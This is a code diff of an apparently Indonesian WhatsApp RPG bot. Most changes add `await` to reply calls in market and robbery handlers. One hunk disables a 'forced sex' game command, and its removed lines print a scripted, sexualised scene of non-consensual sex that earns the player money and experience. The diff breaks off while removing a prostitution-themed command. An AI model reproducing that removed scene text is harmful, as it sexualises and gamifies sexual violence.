   ${vircion} • Babi: ${args[1]}
@@ -20978,7 +21062,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].limit}` < `${jumlh}`) return replyV1(`*Limit Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         db.users[m.sender].limit -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Limit: ${args[1]}
@@ -21000,7 +21084,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].glimit}` < `${jumlh}`) return replyV1(`*Game Limit Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].glimit -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Game Limit: ${args[1]}
@@ -21021,7 +21105,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].paus}` < `${jumlh}`) return replyV1(`*Paus Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].paus -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Paus: ${args[1]}
@@ -21042,7 +21126,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].kepiting}` < `${jumlh}`) return replyV1(`*Kepiting Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].kepiting -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Kepiting: ${args[1]}
@@ -21063,7 +21147,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].gurita}` < `${jumlh}`) return replyV1(`*Gurita Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].gurita -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Gurita: ${args[1]}
@@ -21084,7 +21168,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].cumi}` < `${jumlh}`) return replyV1(`*Cumi Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].cumi -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Cumi: ${args[1]}
@@ -21105,7 +21189,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].buntal}` < `${jumlh}`) return replyV1(`*Buntal Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].buntal -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Buntal: ${args[1]}
@@ -21126,7 +21210,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].dory}` < `${jumlh}`) return replyV1(`*Dory Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].dory -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Dory: ${args[1]}
@@ -21147,7 +21231,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].lumba}` < `${jumlh}`) return replyV1(`*Lumba" Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].lumba -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Lumba": ${args[1]}
@@ -21168,7 +21252,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].lobster}` < `${jumlh}`) return replyV1(`*Lobster Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].lobster -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Lobster: ${args[1]}
@@ -21189,7 +21273,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].hiu}` < `${jumlh}`) return replyV1(`*Hiu Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].hiu -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Hiu: ${args[1]}
@@ -21210,7 +21294,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].udang}` < `${jumlh}`) return replyV1(`*Udang Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].udang -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Udang: ${args[1]}
@@ -21231,7 +21315,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].orca}` < `${jumlh}`) return replyV1(`*Orca Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].orca -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Orca: ${args[1]}
@@ -21252,7 +21336,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].potion}` < `${jumlh}`) return replyV1(`*Potion Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].potion -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Potion: ${args[1]}
@@ -21364,7 +21448,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].emas += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Emas: ${args[1]}
@@ -21385,7 +21469,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].besi += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Besi: ${args[1]}
@@ -21406,7 +21490,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].batubara += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Batu Bara: ${args[1]}
@@ -21427,7 +21511,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].perak += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Perak: ${args[1]}
@@ -21448,7 +21532,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].kayu += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Kayu: ${args[1]}
@@ -21469,7 +21553,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].ayam += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Ayam: ${args[1]}
@@ -21490,7 +21574,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].sapi += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Sapi: ${args[1]}
@@ -21511,7 +21595,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].domba += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Domba: ${args[1]}
@@ -21532,7 +21616,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].ikan += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Ikan: ${args[1]}
@@ -21553,7 +21637,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].rumah += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • rumah: ${args[1]}
@@ -21574,7 +21658,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].emerald += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Emerald: ${args[1]}
@@ -21595,7 +21679,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].diamond += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Diamond: ${args[1]}
@@ -21616,7 +21700,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].botol += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Botol: ${args[1]}
@@ -21637,7 +21721,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].kardus += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Kardus: ${args[1]}
@@ -21658,7 +21742,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].kaleng += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Kaleng: ${args[1]}
@@ -21679,7 +21763,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].gelas += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Gelas: ${args[1]}
@@ -21700,7 +21784,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].plastik += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Plastik: ${args[1]}
@@ -21721,7 +21805,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].banteng += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Banteng: ${args[1]}
@@ -21742,7 +21826,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].gajah += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Gajah: ${args[1]}
@@ -21763,7 +21847,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].harimau += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Harimau: ${args[1]}
@@ -21784,7 +21868,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].kambing += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Kambing: ${args[1]}
@@ -21805,7 +21889,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].panda += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Panda: ${args[1]}
@@ -21826,7 +21910,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].buaya += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Buaya: ${args[1]}
@@ -21847,7 +21931,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].kerbau += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Kerbau: ${args[1]}
@@ -21868,7 +21952,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].monyet += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Monyet: ${args[1]}
@@ -21889,7 +21973,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].babihutan += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Babi Hutan: ${args[1]}
@@ -21910,7 +21994,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].babi += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Babi: ${args[1]}
@@ -21931,7 +22015,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         db.users[m.sender].limit += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Limit: ${args[1]}
@@ -21953,7 +22037,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         db.users[m.sender].glimit += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Game Limit: ${args[1]}
@@ -21974,7 +22058,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].paus += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Paus: ${args[1]}
@@ -21995,7 +22079,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].kepiting += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Kepiting: ${args[1]}
@@ -22016,7 +22100,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].gurita += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Gurita: ${args[1]}
@@ -22037,7 +22121,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].cumi += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Cumi: ${args[1]}
@@ -22058,7 +22142,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].buntal += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Buntal: ${args[1]}
@@ -22079,7 +22163,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].dory += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Dory: ${args[1]}
@@ -22100,7 +22184,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].lumba += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Lumba": ${args[1]}
@@ -22121,7 +22205,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].lobster += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Lobster: ${args[1]}
@@ -22142,7 +22226,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].hiu += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Hiu: ${args[1]}
@@ -22163,7 +22247,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].udang += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Udang: ${args[1]}
@@ -22184,7 +22268,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].orca += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Orca: ${args[1]}
@@ -22205,7 +22289,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].potion += parseInt(args[1])
-        replyV1(`*MARKET - BELI🛍️*
+        await replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Potion: ${args[1]}
@@ -22431,75 +22515,19 @@ ${command} kuli`
       db.users[users].saldo -= hasil * 1
       db.users[m.sender].saldo += hasil * 1
       global.db.erpg[m.sender].lastrampok = new Date * 1
-      replyV1(`Target Berhasil Dirampok Dan Mendapatkan Rp ${hasil}`)
+      await replyV1(`Target Berhasil Dirampok Dan Mendapatkan Rp ${hasil}`)
     }
     break
 
     case 'ewepaksa':
     case 'ewe-paksa': {
-
-      if (!m.isGroup) return replyV1(mess.group || 'Command ini hanya bisa digunakan di grup.')
-      if (!global.db.erpg[m.sender].rpg) return replyV1(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
-      if (global.db.erpg[m.sender].stamina < 1) return replyV1(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
-      let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
-      if (!m.mentionedJid[0] && !m.quoted && !text) return replyV1(`*Tag/Reply Target!*\n\nContoh :\n${command} @0`)
-      let waktuu = await clockString(new Date() - global.db.erpg[m.sender].lastewe)
-      if (new Date() - global.db.erpg[m.sender].lastewe < 43200000) return replyV1(`Kamu Baru Saja ngwe, ${waktuu} Yang Lalu, ewe Lagi nanti.`)
-      let uang = await randomNomor(3000, 19000)
-      let exp = await randomNomor(3444, 7897)
-      replyV1(`kamu membawa nya ke kamar dan membuka paksa baju nya...`)
-      await sleep(3000)
-      replyV1(`Ehh Mau Ngapainn 😣😣...`)
-      await sleep(3000)
-      replyV1(`Ahhh Pelan Pelann, Sakittt😖😖😖....\nAHHH...AHHHH...Pelan Pelan...😖😖😖`)
-      await sleep(3000)
-      replyV1(`Ahhhh, Sakitttt!! >////<\nPlok...Plokkk...Plokkkk😩😖`)
-      await sleep(3000)
-      replyV1(`😖Ahhhh.... Penuhhh.... Angettt😖`)
-      await sleep(3000)
-      replyV1(`*—[ Hasil Ewe ${db.users[m.sender].nama} ]—* 
-➤ 💰 Uang = [ ${uang} ] 
-➤ ✨ Exp = [ ${exp} ] 
-➤ 🎗️ Tugas Selesai = +1`)
-      db.users[m.sender].saldo += uang
-      db.users[m.sender].exp += exp
-      global.db.erpg[m.sender].lastewe = new Date * 1
+      return replyV1('🛡️ Command ini dinonaktifkan. Gunakan duel untuk permainan kompetitif yang aman.')
     }
     break
 
     case 'open-bo':
     case 'openbo': {
-
-      if (!global.db.erpg[m.sender].rpg) return replyV1(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
